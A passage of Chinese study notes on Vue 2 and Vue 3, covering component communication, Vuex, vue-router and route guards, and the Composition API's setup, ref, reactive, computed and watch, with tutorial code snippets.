    > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

## mixin(混入)

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

    第一步定义混合：

    ```
    {
        data(){....},
        methods:{....}
        ....
    }
    ```

    第二步使用混入：

    	全局混入：```Vue.mixin(xxx)```
    	局部混入：```mixins:['xxx']	```

## 插件

1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

    ```js
    对象.install = function (Vue, options) {
        // 1. 添加全局过滤器
        Vue.filter(....)
    
        // 2. 添加全局指令
        Vue.directive(....)
    
        // 3. 配置全局混入(合)
        Vue.mixin(....)
    
        // 4. 添加实例方法
        Vue.prototype.$myMethod = function () {...}
        Vue.prototype.$myProperty = xxxx
    }
    ```

4. 使用插件：```Vue.use()```

## scoped样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```

## 总结TodoList案例

1. 组件化编码流程：

   1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

   2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

      1. 一个组件在用：放在组件自身即可。

      2.  一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

   3. 实现交互：从绑定事件开始。

2. props适用于：

   1. 父组件 ==> 子组件 通信

   2. 子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

## webStorage

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

    1. ```xxxxxStorage.setItem('key', 'value');```
        				该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

    2. ```xxxxxStorage.getItem('person');```

        		该方法接受一个键名作为参数，返回键名对应的值。

    3. ```xxxxxStorage.removeItem('key');```

        		该方法接受一个键名作为参数，并把该键名从存储中删除。

    4. ``` xxxxxStorage.clear()```

        		该方法会清空存储中的所有数据。

4. 备注：

    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
    2. LocalStorage存储的内容，需要手动清除才会消失。
    3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
    4. ```JSON.parse(null)```的结果依然是null。

## 组件的自定义事件

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

    1. 第一种方式，在父组件中：```<Demo @ceshi="test"/>```  或 ```<Demo v-on:ceshi="test"/>```

    2. 第二种方式，在父组件中：

        ```js
        <Demo ref="demo"/>
        ......
        mounted(){
           this.$refs.xxx.$on('ceshi',this.test)
        }
        ```

    3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('ceshi',数据)```		

5. 解绑自定义事件```this.$off('ceshi')``` ```this.$off(['ceshi','ceshi2'])```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('ceshi',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！
8. 销毁Vue实例或Vue组件实例后，组件身上的所有自定义事件都会不起作用

## 全局事件总线（GlobalEventBus）

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }
      ```

   2. 提供数据：```this.$bus.$emit('xxxx',数据)```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。

## 消息订阅与发布（pubsub）

1.   一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```

   4. 提供数据：```pubsub.publish('xxx',数据)```

   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>
## nextTick

1. 语法：```this.$nextTick(回调函数)```
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

## Vue封装的过度与动画

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 图示：
   <img src="https://cn.vuejs.org/images/transition.png" style="width:60%" />

3. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

      ```vue
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      <style>
         /* 上面name指定的什么，下面的 v 就变成什么 */
         .v-enter-active{
            ···
         }
         .hello-enter-active{
            ···
         }
      </style>
      ```
   3. ```appear ``` 初始渲染的过渡，一开始就使用过渡  
   4. 自定义过渡类名（可以使用动画库，例如animation.css）
      - enter-class
      - enter-active-class
      - enter-to-class (2.1.8+)
      - leave-class
      - leave-active-class
      - leave-to-class (2.1.8+)
   4. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。

## vue脚手架配置代理

### 方法一

	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

### 方法二

	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。

## 插槽

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```vue
      父组件中：
              <Category>
                 <div>html结构1</div>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot>插槽默认内容...</slot>
                  </div>
              </template>
      ```

   2. 具名插槽：

      ```vue
      父组件中：
              <Category>
                  <template slot="center">
                    <div>html结构1</div>
                  </template>
      
                  <template v-slot:footer>
                     <div>html结构2</div>
                  </template>
                  <template #footer>
                     <div>html结构2</div>
                  </template>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot name="center">插槽默认内容...</slot>
                     <slot name="footer">插槽默认内容...</slot>
                  </div>
              </template>
      ```

   3. 作用域插槽：

      1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

      2. 具体编码：

         ```vue
         父组件中：
         		<Category>
         			<template scope="scopeData">
         				<!-- 生成的是ul列表 -->
         				<ul>
         					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
         				</ul>
         			</template>
         		</Category>
         
         		<Category>
         			<template slot-scope="scopeData">
         				<!-- 生成的是h4标题 -->
         				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
         			</template>
         		</Category>
         子组件中：
                 <template>
                     <div>
                         <slot :games="games"></slot>
                     </div>
                 </template>
         		
                 <script>
                     export default {
                         name:'Category',
                         props:['title'],
                         //数据在子组件自身
                         data() {
                             return {
                                 games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                             }
                         },
                     }
                 </script>
         ```
   ```
   
   ```

## Vuex

### 1.概念

		在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

### 2.何时使用？

		多个组件需要共享数据时

### 3.搭建vuex环境

1. 创建文件：```src/store/index.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //应用Vuex插件
   Vue.use(Vuex)
   
   //准备actions对象——响应组件中用户的动作
   const actions = {}
   //准备mutations对象——修改state中的数据
   const mutations = {}
   //准备state对象——保存具体的数据
   const state = {}
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state
   })
   ```

2. 在```main.js```中创建vm时传入```store```配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......
   
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	store
   })
   ```

###    4.基本使用

1. 初始化数据、配置```actions```、配置```mutations```，操作文件```store.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //引用Vuex
   Vue.use(Vuex)
   
   const actions = {
       //响应组件中加的动作
   	jia(context,value){
   		// console.log('actions中的jia被调用了',miniStore,value)
   		context.commit('JIA',value)
   	},
   }
   
   const mutations = {
       //执行加
   	JIA(state,value){
   		// console.log('mutations中的JIA被调用了',state,value)
   		state.sum += value
   	}
   }
   
   //初始化数据
   const state = {
      sum:0
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state,
   })
   ```

2. 组件中读取vuex中的数据：```$store.state.sum```

3. 组件中修改vuex中的数据：```$store.dispatch('action中的方法名',数据)``` 或 ```$store.commit('mutations中的方法名',数据)```

   >  备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写```dispatch```，直接编写```commit```，actions中可以多次调用dispath

### 5.getters的使用

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

3. 组件中读取数据：```$store.getters.bigSum```

### 6.四个map方法的使用

1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

   ```js
   import {mapState} from 'vuex'
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

   ```js
   import {mapGetters} from 'vuex'
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),
   
       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

3. <strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数

   ```js
   import {mapActions} from 'vuex'
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   
       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

4. <strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数

   ```js
   import {mapMutations} from 'vuex'
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
       
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。 ```<button @click="increment(xxx)">点击+1</button>```

### 7.模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改```store.js```

   ```javascript
   const countAbout = {
     namespaced:true,//开启命名空间
     state:{x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){
          return state.sum * 10
       }
     }
   }
   
   const personAbout = {
     namespaced:true,//开启命名空间
     state:{ ... },
     mutations: { ... },
     actions: { ... }
   }
   
   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ```

3. 开启命名空间后，组件中读取state数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

4. 开启命名空间后，组件中读取getters数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

5. 开启命名空间后，组件中调用dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

6. 开启命名空间后，组件中调用commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```

 ## 路由

1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件。

### 1.基本使用

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入Luyou 组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		}
   	]
   })
   
   //暴露router
   export default router
   ```

4. 实现切换（active-class可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

### 2.几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

### 3.多级路由（嵌套路由）

1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```vue
   <router-link to="/home/news">News</router-link>
   ```

### 4.路由的query参数

1. 传递参数

   ```vue
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id
   $route.query.title
   ```

### 5.命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
        {
          path:'/demo',
          component:Demo,
          children:[
            {
              path:'test',
              component:Test,
              children:[
                {
                  //给路由命名
                  name:'hello',
                  path:'welcome',
                  component:Hello,
                }
              ]
            }
          ]
        }
      ```

   2. 简化跳转：

      ```vue
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		  id:666,
            title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```

### 6.路由的params参数

1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```

### 7.路由的props配置

	作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

### 8.```<router-link>```的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```

### 9.编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   
   this.$router.replace({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退
   ```

### 10.缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   ```vue
   <keep-alive include="News"> 
       <router-view></router-view>
   </keep-alive>
   ```

### 11.两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。
   2. ```deactivated```路由组件失活时触发。

### 12.路由守卫

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

   ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to,from,next)=>{
   	console.log('beforeEach',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'ceshi'){ //权限控制的具体规则
   			next() //放行
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next() //放行
   	}
   })
   
   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to,from)=>{
   	console.log('afterEach',to,from)
   	if(to.meta.title){ 
   		document.title = to.meta.title //修改网页的title
   	}else{
   		document.title = 'vue_test'
   	}
   })
   ```

4. 独享守卫:

   ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'ceshi'){
   			next()
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next()
   	}
   }
   ```

5. 组件内守卫：

   ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
   ```

### 13.路由器的两种工作模式



1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式：
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。例如：node.js中有一个中间件 ```connect-history-api-fallback``` 
	
	 

	 


# Vue3

## 认识Vue3

### 相关信息

  1. 正式版在2020年九月发布
  2. 支持Vue2中大部分的特性
  3. 更好的支持了typescript

### 提升

  1. 打包大小减少41%
  2. 初次渲染快55%，更新渲染快133%
  3. 内存减少54%
  4. 使用Proxy代替defineProperty实现数据响应式
  5. 重写虚拟DOM和Tree-Shaking

### 新增特性

  1. 新的生命周期钩子 即 Composition（组合）API
  2. setup
      - ref和reactive
      - computed和watch
      - 新的生命周期函数
      - provide和reject
      - ...
  3. 新组件
      - Fragment 文档碎片
      - Teleport 瞬移组件的位置
      - Suspense 异步组件
  4. 其他API更新
      - 全局API修改
      - 将原来的全局API转移到应用对象
      - 模板语法变化
      - 移除keyCode支持作为 v-on 的修饰符
      - data 选项应始终被声明为一个函数

## 生命周期
### Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：

- ```beforeDestroy```改名为 ```beforeUnmount```
- ```destroyed```改名为 ```unmounted```
### 与 2.x 版本生命周期相对应的组合式 API

  - `beforeCreate` -> 使用 `setup()`
  - `created` -> 使用 `setup()`
  - `beforeMount` -> `onBeforeMount`
  - `mounted` -> `onMounted`
  - `beforeUpdate` -> `onBeforeUpdate`
  - `updated` -> `onUpdated`
  - `beforeDestroy` -> `onBeforeUnmount`
  - `destroyed` -> `onUnmounted`
  - `errorCaptured` -> `onErrorCaptured`

### 图示

  - Vue2
    ![Vue2 实例生命周期](https://z3.ax1x.com/2021/10/28/5LmkH1.png)
    <!-- ![Vue2 实例生命周期](https://cn.vuejs.org/images/lifecycle.png) -->

  - Vue3

    ![vue3实例的生命周期](https://v3.cn.vuejs.org/images/lifecycle.svg)

## 创建项目

### 使用vue-cli创建 https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create

  ```
  npm install -g @vue/cli
  // 必须保证vue cli 版本在4.5.0以上
  vue create my-project
  ```

### 使用vite创建 https://v3.cn.vuejs.org/guide/installation.html

  ```
  yarn create @vitejs/app
  ```

## Composition API https://composition-api.vuejs.org/zh/api.html

### setup

  1. 新的option, 所有的组合API函数都在此使用, 只在初始化时执行一次
  2. 在beforeCreated之前执行, 此时组件对象还没有创建,this是undefined,不能通过this来访问data/computed/methods / props
  3. 函数如果返回对象, 对象中的属性或方法, 模板中可以直接使用,
      - 返回对象中的属性会与data函数返回对象的属性合并成为组件对象的属性
      - 返回对象中的方法会与methods中的方法合并成功组件对象的方法.
      - 如果有重名, setup优先
      - 一般不要混合使用: methods中可以访问setup提供的属性和方法, 但在setup方法中不能访问data和methods
  4. setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）
  5. setup的参数
      - setup(props, context) / setup(props, {attrs, slots, emit})
      - props: 包含props配置声明且传入了的所有属性的对象
      - attrs: 包含没有在props配置中声明的属性的对象, 相当于 this.$attrs(如果组件未申明接收属性，那么传递的属性便会在$attrs上)
      - slots: 包含所有传入的插槽内容的对象, 相当于 this.$slots(如果组件未申明插槽，那么组件使用时用的插槽内容便会在$slots上)
      - emit: 用来分发自定义事件的函数, 相当于 this.$emit

      ```vue
      <script>
      export default {
        setup () {
          return {}
        }
      }
      </script>
      ```


### ref

  1. 作用: 定义一个数据的响应式
  2. 语法: const xxx = ref(initValue):
      - 创建一个包含响应式数据的引用(reference)对象
      - js中操作数据: xxx.value
      - 模板中操作数据: 不需要.value
  3. 一般用来定义一个基本类型的响应式数据
  4. 如果用ref对象/数组, 内部会自动将对象/数组转换为reactive的代理对象
  5. 递归深度响应式

      ```vue
      <script>
      import {
        ref
      } from 'vue'
      export default {
        setup () {
      
          // 定义响应式数据 ref对象
          const count = ref(1)
          console.log(count)
      
          // 更新响应式数据的函数
          function update () {
            // alert('update')
            count.value = count.value + 1
          }
      
          return {
            count,
            update
          }
        }
      }
      </script>
      ```

### reactive

  1. 作用: 定义多个数据的响应式
  2. const proxy = reactive(obj): 接收一个普通对象然后返回该普通对象的响应式代理器对象
  3. 通过使用Proxy来实现对对象内部所有数据的劫持, 并通过Reflect操作对象内部数据
  4. 递归深度响应式

      ```html
      <template>
        <h2>name: {{state.name}}</h2>
        <h2>age: {{state.age}}</h2>
        <h2>wife: {{state.wife}}</h2>
        <hr>
        <button @click="update">更新</button>
      </template>
      
      <script>
      /* 
      reactive: 
          作用: 定义多个数据的响应式
          const proxy = reactive(obj): 接收一个普通对象然后返回该普通对象的响应式代理器对象
          响应式转换是“深层的”：会影响对象内部所有嵌套的属性
          内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据都是响应式的
      */
      import {
        reactive,
      } from 'vue'
      export default {
        setup () {
          /* 
          定义响应式数据对象
          */
          const state = reactive({
            name: 'tom',
            age: 25,
            wife: {
              name: 'marry',
              age: 22
            },
          })
          console.log(state, state.wife)
      
          const update = () => {
            state.name += '--'
            state.age += 1
            state.wife.name += '++'
            state.wife.age += 2
          }
      
          return {
            state,
            update,
          }
        }
      }
      </script>
      ```
### reactive对比ref
  1. 从定义数据角度对比：
      - ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。
      - reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。
      - 备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过```reactive```转为<strong style="color:#DD5145">代理对象</strong>。
  2. 从原理角度对比：
      - ref通过``Object.defineProperty()``的```get```与```set```来实现响应式（数据劫持）。
      - reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。
  3. 从使用角度对比：
      - ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong>```.value```，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong>```.value```。
      - reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong>```.value```。
### 计算属性和监视

  - computed
      - 与computed配置功能一致
      - 写法
         ```js
         import {computed} from 'vue'
         
         setup(){
               ...
            //计算属性——简写
               let fullName = computed(()=>{
                  return person.firstName + '-' + person.lastName
               })
               //计算属性——完整
               let fullName = computed({
                  get(){
                     return person.firstName + '-' + person.lastName
                  },
                  set(value){
                     const nameArr = value.split('-')
                     person.firstName = nameArr[0]
                     person.lastName = nameArr[1]
                  }
               })
         }
         ```
  - watch
      - 与watch配置功能一致
      - 监视指定的一个或多个响应式数据, 一旦数据变化, 就自动执行监视回调
      - 默认初始时不执行回调, 但可以通过配置immediate为true, 来指定初始时立即执行第一次
      - 通过配置deep为true, 来指定深度监视
      - 两个小“坑”：
         1. 监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。
         2. 监视reactive定义的响应式数据中某个属性时：deep配置有效。

         ```js
         //情况一：监视ref定义的响应式数据
         watch(sum,(newValue,oldValue)=>{
            console.log('sum变化了',newValue,oldValue)
         },{immediate:true})

         //情况二：监视多个ref定义的响应式数据
         watch([sum,msg],(newValue,oldValue)=>{
            console.log('sum或msg变化了',newValue,oldValue)
         }) 

         /* 情况三：监视reactive定义的响应式数据
                  若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
                  若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
         */
         watch(person,(newValue,oldValue)=>{
            console.log('person变化了',newValue,oldValue)
         },{immediate:true,deep:false}) //此处的deep配置不再奏效

         //情况四：监视reactive定义的响应式数据中的某个属性
         watch(()=>person.job,(newValue,oldValue)=>{
            console.log('person的job变化了',newValue,oldValue)
         },{immediate:true,deep:true}) 

         //情况五：监视reactive定义的响应式数据中的某些属性
         watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
            console.log('person的job变化了',newValue,oldValue)
         },{immediate:true,deep:true})

         //特殊情况
         watch(()=>person.job,(newValue,oldValue)=>{
            console.log('person的job变化了',newValue,oldValue)
         },{deep:true}) //此处由于监视的是reactive定义的对象中的某个属性，所以deep配置有效
         ```

  - watchEffect
      - watch的套路是：既要指明监视的属性，也要指明监视的回调。
